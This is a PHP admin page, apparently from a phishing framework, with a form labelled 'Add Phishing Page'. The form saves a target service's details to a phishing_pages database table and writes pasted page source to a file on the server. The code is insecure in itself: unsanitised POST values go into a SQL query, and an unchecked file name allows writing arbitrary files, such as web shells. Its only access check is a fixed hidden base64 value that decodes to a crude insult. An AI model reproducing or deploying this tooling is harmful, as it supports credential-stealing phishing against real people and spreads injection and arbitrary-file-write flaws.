<div class="content">
    
<?php
$page_file_name = @$_POST['filename'];
$page_service = @$_POST['service'];
$page_description = @$_POST['description'];
$page_source_code = @$_POST['sourcecode'];
$validate = @$_POST['validate'];

if ($validate == "eW91ciBtb3RoZXIncyB2YWdhaW5h")
{
    if ($page_file_name != "" && $page_service != "" && $page_description != "" && $page_source_code != "")
    {
        if (mysql_query("INSERT INTO phishing_pages(service,filename,description,url) VALUES('$page_service','$page_file_name','$page_description','http://localhost/framework/pages/$page_file_name')")) {
            
            $handle = fopen(dirname(__FILE__)."/../pages/".$page_file_name, 'w')
                    or die("Unable to create the file.");
            if ($handle) {
                fwrite($handle, $page_source_code);
                fclose($handle);
            }
            
            echo "<div align='center' class=\"alert alert-success\" role=\"alert\">
                    <strong>Success!</strong> the phishing page link has been added successfuly.</div>";
        } else {
            echo "<div align='center' class=\"alert alert-danger\" role=\"alert\">
                    <strong>Error!</strong>".mysql_error()."</div>";
        }
    } else {
        echo "<div align='center' class=\"alert alert-danger\" role=\"alert\">
                    <strong>Error!</strong> You should fill everything</div>";
    }
}
?>
<form class="form-horizontal" method="post" action="index.php?id=1&action=4">
  
    
  <div class="form-group">
      <label for="service" class="col-sm-2 control-label">File name</label>
          <div class="col-sm-10">
            <input type="text" class="form-control" id="service" name="filename" placeholder="PageName.html or similar" style="width: 15cm;">
          </div>
  </div>
  <div class="form-group">
      <label for="service" class="col-sm-2 control-label">Service</label>
    <div class="col-sm-10">
      <input type="text" class="form-control" id="service" name="service" placeholder="Service name" style="width: 15cm;">
    </div>
  </div>
    
  <div class="form-group">
    <label for="description" class="col-sm-2 control-label">Description</label>
    <div class="col-sm-10">
        <input type="text" class="form-control" id="description" name="description" placeholder="Description" style="width: 15cm;">
    </div>
  </div>
    
    <div class="form-group">
    <label for="URL" class="col-sm-2 control-label">Source Code</label>
    <div class="col-sm-10">
        <textarea spellcheck="false" class="form-control" name="sourcecode" placeholder="Place your source code here" style="width: 15cm;height:10cm;"></textarea> 
    </div>
  </div>
    <input type="hidden" name="validate" value="eW91ciBtb3RoZXIncyB2YWdhaW5h" />
  <div class="form-group">
    <div class="col-sm-offset-2 col-sm-10">
      <button type="submit" class="btn btn-default">Add Phishing Page</button>
    </div>
  </div>
</form>
    
    

</div>